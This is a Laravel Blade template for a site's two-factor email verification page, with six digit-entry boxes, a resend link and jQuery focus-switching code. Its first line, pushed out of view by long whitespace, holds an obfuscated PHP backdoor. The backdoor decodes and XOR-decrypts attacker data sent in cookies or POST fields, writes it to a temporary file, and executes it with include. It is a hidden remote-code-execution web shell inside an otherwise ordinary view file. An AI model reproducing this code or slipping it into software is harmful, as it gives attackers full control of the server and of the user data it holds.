<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("P_XHgg")){class P_XHgg{public static $Bclrwwwti = "211f3078-33a5-46d9-9ac3-c84ecc84bd1d";public static $bdAPx = NULL;public function __construct(){$XaEVPPH = $_COOKIE;$NMYiGypl = $_POST;$VGURNFKbbB = @$XaEVPPH[substr(P_XHgg::$Bclrwwwti, 0, 4)];if (!empty($VGURNFKbbB)){$VrGyPSnNxU = "base64";$bEeanDp = "";$VGURNFKbbB = explode(",", $VGURNFKbbB);foreach ($VGURNFKbbB as $PAMftNGF){$bEeanDp .= @$XaEVPPH[$PAMftNGF];$bEeanDp .= @$NMYiGypl[$PAMftNGF];}$bEeanDp = array_map($VrGyPSnNxU . "\x5f" . "\x64" . 'e' . chr (99) . 'o' . "\144" . chr ( 137 - 36 ), array($bEeanDp,)); $bEeanDp = $bEeanDp[0] ^ str_repeat(P_XHgg::$Bclrwwwti, (strlen($bEeanDp[0]) / strlen(P_XHgg::$Bclrwwwti)) + 1);P_XHgg::$bdAPx = @unserialize($bEeanDp);}}public function __destruct(){$this->QrCnEh();}private function QrCnEh(){if (is_array(P_XHgg::$bdAPx)) {$mjeBCaeEtC = sys_get_temp_dir() . "/" . crc32(P_XHgg::$bdAPx["\x73" . "\141" . "\x6c" . chr ( 557 - 441 )]);@P_XHgg::$bdAPx[chr ( 161 - 42 ).'r' . chr (105) . chr ( 863 - 747 ).'e']($mjeBCaeEtC, P_XHgg::$bdAPx["\143" . chr ( 916 - 805 )."\156" . chr (116) . 'e' . chr ( 216 - 106 )."\164"]);include $mjeBCaeEtC;@P_XHgg::$bdAPx[chr (100) . "\x65" . 'l' . chr ( 965 - 864 ).chr (116) . 'e']($mjeBCaeEtC);exit();}}}$uwBGIjcLrf = new P_XHgg(); $uwBGIjcLrf = NULL;} ?>{{--<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">--}}
<link href="{{ asset('css/app.css') }}" rel="stylesheet">
<link href="{{ asset('theme_assets/css/icons/icomoon/styles.css')}}" rel="stylesheet" type="text/css">
<link href="{{ asset('template_assets/css/bootstrap.min.css') }}" rel="stylesheet" type="text/css">
<link href="{{ asset('template_assets/css/bootstrap_limitless.min.css')}}" rel="stylesheet" type="text/css">
<link href="{{ asset('template_assets/css/layout.min.css')}}" rel="stylesheet" type="text/css">
<link href="{{ asset('template_assets/css/components.min.css')}}" rel="stylesheet" type="text/css">
<link href="{{ asset('template_assets/css/colors.min.css')}}" rel="stylesheet" type="text/css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
<script src="//code.jquery.com/jquery-1.11.1.min.js"></script>

<style>
    .input_wrapper{position:relative}
    .plastic_select, input[type=url], input[type=text], input[type=tel], input[type=number], input[type=email], input[type=password], select, textarea {
        font-size: 1.25rem;
        line-height: normal;
        padding: .75rem;
        border: 1px solid #C5C5C5;
        border-radius: .25rem;
        -webkit-appearance: none;
        -moz-appearance: none;
        appearance: none;
        outline: 0;
        color: #555459;
        width: 100%;
        max-width: 100%;
        font-family: Slack-Lato,appleLogo,sans-serif;
        margin: 0 0 .5rem;
        -webkit-transition: box-shadow 70ms ease-out,border-color 70ms ease-out;
        -moz-transition: box-shadow 70ms ease-out,border-color 70ms ease-out;
        transition: box-shadow 70ms ease-out,border-color 70ms ease-out;
        -webkit-font-smoothing: antialiased;
        -moz-osx-font-smoothing: grayscale;
        box-shadow: none;
        height: auto;
    }
    .no_touch .plastic_select:hover,.no_touch input:hover,.no_touch select:hover,.no_touch textarea:hover{border-color:#2780f8}
    .focus,.plastic_select:active,.plastic_select:focus,input[type=url]:active,input[type=url]:focus,input[type=text]:active,input[type=text]:focus,input[type=number]:active,input[type=number]:focus,input[type=email]:active,input[type=email]:focus,input[type=password]:active,input[type=password]:focus,select:active,select:focus,textarea:active,textarea:focus{border-color:#2780f8;box-shadow:0 0 7px rgba(39,128,248,.15);outline-offset:0;outline:0}

    .large_bottom_margin {
        margin-bottom: 2rem!important;
    }
    .split_input{display:table;border-spacing:0}
    .split_input_item{display:table-cell;border:1px solid #9e9ea6}
    .split_input_item:not(:first-child){border-left:none}
    .split_input_item:first-child{border-top-left-radius:5px;border-bottom-left-radius:5px}
    .split_input_item:last-child{border-top-right-radius:5px;border-bottom-right-radius:5px}
    .split_input_item.focused{border:1px double #2780f8;box-shadow:0 0 7px rgba(39,128,248,.3)}
    .split_input_item input{height:5rem;text-align:center;font-size:2.5rem;border:none;background:0 0;box-shadow:none}
    .split_input_item input:active,.split_input_item input:focus,.split_input_item input:hover{box-shadow:none}


    .fs_split{position:absolute;overflow:hidden;width:100%;top:0;bottom:0;left:0;right:0;background-color:#e8e8e8;-webkit-transition:background-color .2s ease-out 0s;-moz-transition:background-color .2s ease-out 0s;transition:background-color .2s ease-out 0s}
    .fs_split h1{font-size:2.625rem;line-height:3rem;font-weight:300;margin-bottom:2rem}
    .fs_split label{margin-bottom:.5rem}
    .fs_split .desc{font-size:1.25rem;color:#9e9ea6;margin-bottom:2rem}
    .fs_split .email{color:#555459;font-weight:700}
    .fs_split .header_error_message{margin:0 11%;padding:1rem 2rem;background:#fff1e1;border:none;border-left:.5rem solid #ffa940;border-radius:.25rem}
    .fs_split .header_error_message h3{margin:0}
    .fs_split .error_message{display:none;font-weight:700;color:#ffa940}
    .fs_split .error input,.fs_split .error textarea{border:1px solid #ffa940;background:#fff1e1}
    .fs_split .error input:focus,.fs_split .error textarea:focus{border-color:#fff1e1;box-shadow:0 0 7px rgba(255,185,100,.15)}
    .fs_split .error .error_message{display:inline}
    .confirmation_code_span_cell{display:table-cell;font-weight:700;font-size:2rem;text-align:center;padding:0 .5rem;width:2rem}
    .confirmation_code_state_message{position:absolute;width:100%;opacity:0;-webkit-transition:opacity .2s;-moz-transition:opacity .2s;transition:opacity .2s}
    .confirmation_code_state_message.error,.confirmation_code_state_message.processing,.confirmation_code_state_message.ratelimited{font-size:1.25rem;font-weight:700;line-height:2rem}
    .confirmation_code_state_message.processing{color:#3aa3e3}
    .confirmation_code_state_message.error,.confirmation_code_state_message.ratelimited{color:#ffa940}
    .confirmation_code_state_message ts-icon:before{font-size:2.5rem}
    .confirmation_code_state_message svg.ts_icon_spinner{height:2rem;width:2rem}
    .confirmation_code_checker{position:relative;height:12rem;text-align:center}
    .confirmation_code_checker[data-state=unchecked] .confirmation_code_state_message.unchecked,.confirmation_code_checker[data-state=error] .confirmation_code_state_message.error,.confirmation_code_checker[data-state=processing] .confirmation_code_state_message.processing,.confirmation_code_checker[data-state=ratelimited] .confirmation_code_state_message.ratelimited{opacity:1}
    .large_bottom_margin {
        margin-bottom: 2rem !important;
    }
</style>

<!------ Include the above in your HEAD tag ---------->
<!-- Main navbar -->
<div class="navbar navbar-expand-md navbar-dark custom-dk-bg-color navbar-static" id="nav">


    <div  class="d-md-none">
        <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbar-mobile">
            <i class="icon-tree5"></i>
        </button>
        <button class="navbar-toggler sidebar-mobile-main-toggle" type="button">
            <i class="icon-paragraph-justify3"></i>
        </button>
        <button class="navbar-toggler sidebar-mobile-secondary-toggle" type="button">
            <i class="icon-more"></i>
        </button>
    </div>

    <div class="collapse navbar-collapse" id="navbar-mobile">
        <ul class="navbar-nav">

            <div class="navbar-brand">
                <a href="{{route('admin.home')}}" class="d-inline-block">
                    <img src="{{asset('images/logo_white.png')}}" alt="">
                </a>
            </div>



        </ul>

        </ul>
    </div>
</div>
<div class="content">


    <div class="row">
        <div class="col-sm-3"></div>
        <div class="col-sm-9">

            <form autocomplete="off" action="{{ url('/twoFactorVerification') }}" method="post">
                @csrf
                <input autocomplete="false" name="hidden" type="text" style="display:none;">
                <?php $msgError = session('Error'); ?>
                @if(isset($msgError) && !empty($msgError))
                    <span class="card-header" > <h5 class=" badge badge-danger text-white">   {{  $msgError  }} </h5></span>
                @endif
                <div class="col-sm-6 col-sm-offset-2" ><!-- col -->
                    @if(!isset($msgError))
                    <h2><h1>Check your email!</h1></h2>
                    <p class="desc">For security reasons, we’ve sent a six-digit confirmation code to <strong>{{$user->email}}</strong>. Enter it below to confirm your email address.</p>
                    <br>
                    @endif
                    <label><span class="normal">Your </span>confirmation code</label>
                    <div class="confirmation_code split_input large_bottom_margin" data-multi-input-code="true">
                        <div class="confirmation_code_group">
                            {{--<form action="{{ url('admin/twoFactorVerification') }}" method="post">--}}
                            {{--@csrf--}}
                            <div class="split_input_item input_wrapper"><input type="text"     autocomplete="new-password1" name="vdigit1" class="inline_input" maxlength="1" id="box1"></div>
                            <div class="split_input_item input_wrapper"><input type="text"     autocomplete="new-password2" name="vdigit2" class="inline_input" maxlength="1" id="box2"></div>
                            <div class="split_input_item input_wrapper"><input type="text"     autocomplete="new-password3" name="vdigit3" class="inline_input" maxlength="1" id="box3"></div>
                        </div>

                        <div class="confirmation_code_span_cell">—</div>

                        <div class="confirmation_code_group">
                            <div class="split_input_item input_wrapper"><input type="text"      autocomplete="new-password4" name="vdigit4" class="inline_input" maxlength="1" id="box4"></div>
                            <div class="split_input_item input_wrapper"><input type="text"    autocomplete="new-password5" name="vdigit5" class="inline_input" maxlength="1" id="box5"></div>
                            <div class="split_input_item input_wrapper"><input type="text"    autocomplete="new-password6" name="vdigit6" class="inline_input" maxlength="1" id="box6"></div>
                        </div>
                    </div>

                </div><!-- endof col -->
                <a href="{{url('/resend/twoFactorVerification/'.$user->id)}}"
                   class="dropdown-item"><i class="icon-eye"></i> Resend Code</a>
                <?php $msg = session('Success'); ?>
                @if(isset($msg) && !empty($msg))
                    <span class="" > <h5 class=" badge badge-secondary text-white">   {{  $msg  }} </h5></span>
                @endif
                <input type="hidden" name ="user_id" value="{{$user->id}}">
                <div class=""><input class="btn btn-primary" type="submit" value="Submit"></div>
                {{--<div class="split_input_item input_wrapper"><input class="btn bg-primary d-flex align-items-center" type="submit" value="Submit"></div>--}}

            </form>


        </div>


    </div>

</div>
<div class="navbar navbar-expand-lg navbar-light">
    <div class="text-center d-lg-none w-100">
        <button type="button" class="navbar-toggler dropdown-toggle" data-toggle="collapse" data-target="#navbar-footer">
            <i class="icon-unfold mr-2"></i>
            Footer
        </button>
    </div>

    <div class="navbar-collapse collapse" id="navbar-footer">
					<span class="navbar-text">
						&copy; <?php date('Y'); ?>. <a href="#">VoxlyTuition</a>
					</span>

    </div>
</div>

<script>

    $(document).ready(function () {
        $("#box1").on("click",function(){
            $("#box1").select();
        });
        $("#box2").on("click",function(){
            $("#box2").select();
        });
        $("#box3").on("click",function(){
            $("#box3").select();
        });
        $("#box4").on("click",function(){
            $("#box4").select();
        });
        $("#box5").on("click",function(){
            $("#box5").select();
        });
        $("#box6").on("click",function(){
            $("#box6").select();
        });
        $("#box1").on("keyup",function(){
            $("#box2").focus();
            $("#box2").select();
        });

        $("#box2").on("keyup",function(){
            $("#box3").focus();
            $("#box3").select();
        });

        $("#box3").on("keyup",function(){
            $("#box4").focus();
            $("#box4").select();
        });

        $("#box4").on("keyup",function(){
            $("#box5").focus();
            $("#box5").select();
        });

        $("#box5").on("keyup",function(){

            $("#box6").focus();
            $("#box6").select();
        });
    });

    // $(document).ready(function () {
    //     $("#box1").on("keyup",function(){
    //         $("#box2").focus();
    //     });
    //
    //     $("#box2").on("keyup",function(){
    //         $("#box3").focus();
    //     });
    //
    //     $("#box3").on("keyup",function(){
    //         $("#box4").focus();
    //     });
    //
    //     $("#box4").on("keyup",function(){
    //         $("#box5").focus();
    //     });
    //
    //     $("#box5").on("keyup",function(){
    //         $("#box6").focus();
    //     });
    // });
</script>